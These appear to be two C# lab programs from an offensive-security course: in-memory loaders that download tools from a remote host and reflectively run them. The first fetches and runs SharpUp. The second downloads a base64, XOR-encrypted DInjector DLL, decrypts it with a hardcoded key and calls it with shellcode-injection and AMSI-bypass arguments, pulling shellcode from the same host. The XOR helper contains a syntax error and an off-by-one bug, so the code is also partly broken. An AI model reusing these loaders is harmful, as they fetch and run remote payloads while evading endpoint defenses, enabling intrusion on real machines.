using System;
using System.Reflection;
using System.Net;

namespace SharpUpAssemblyLoad
{
    class Program
    {

        static public void Main(String[] args)

        {


            Console.WriteLine("Running SharpUp.exe");

            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");

            // Reflectively load assembly from a file on disk
            // Assembly assembly = Assembly.LoadFile(@"C:\\Users\mikeg\Source\Repos\SharpEnumLibrary\SharpEnumLibrary\bin\Debug\SharpEnumLibrary.dll");

            // Reflectively load assembly from a remote URL
            Assembly assembly = Assembly.Load(wc.DownloadData("http://192.168.49.207/sharpup.exe"));

            // Reflectively load assembly from base64 encoded file via a remote URL
            // Assembly assembly = Assembly.Load(System.Convert.FromBase64String(wc.DownloadString("https://attacker.host/SharpEnumLibrary.dll.b64")));

            // Get your assembly.
            //Assembly assembly = Assembly.LoadFile(@"C:\Users\Offsec\Desktop\SharpUp\SharpUp\bin\x64\Release\SharpUp.exe");

            // Get your point of entry.
            MethodInfo entryPoint = assembly.EntryPoint;

            // Invoke point of entry with arguments.
            entryPoint.Invoke(null, new object[] { new string[] { "audit" } });

        }



    }
}


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Net;
using System.IO;

using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Derp
{
    class Program
    {
        private static string XorWithKey(string text, string key)
        {
            var decrypted = new StringBuilder();

            for (int i = 0; i < (text.Length - 1); i++)
            {
                decrypted.Append((char)((uint)text[i] ^ (uint)key[i % key.Length]));
            }

            return decrypted.ToString().
        }
        static void Main(string[] args)
        {
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");

            // Reflectively load assembly from a file on disk
            //var a = Assembly.LoadFile(@"C:\\Users\mikeg\Source\Repos\SharpEnumLibrary\SharpEnumLibrary\bin\Debug\SharpEnumLibrary.dll");

            // Reflectively load assembly from a remote URL
            //var a = Assembly.Load(wc.DownloadData("https://attacker.host/SharpEnumLibrary.dll"));

            // Reflectively load assembly from base64 encoded file via a remote URL
            //var a = Assembly.Load(System.Convert.FromBase64String(wc.DownloadString("https://attacker.host/SharpEnumLibrary.dll.b64")));

            // Reflectively load assembly from base64 encoded xor encrypted file via a remote URL
            var a = Assembly.Load(System.Convert.FromBase64String(
                    XorWithKey(wc.DownloadString("http://192.168.49.207/dinjector.dll.b64.xor"),"coldpizza")
                ));

            var t = a.GetType("McChicken.Spicy");
            var c = Activator.CreateInstance(t);

            var m = t.GetMethod("Boom");
            var output = m.Invoke(c, new string[] { "currentthread /sc:http://192.168.49.207/enc /p:coldpizza /blockDlls:True /am51:True" } );

        }
    }
}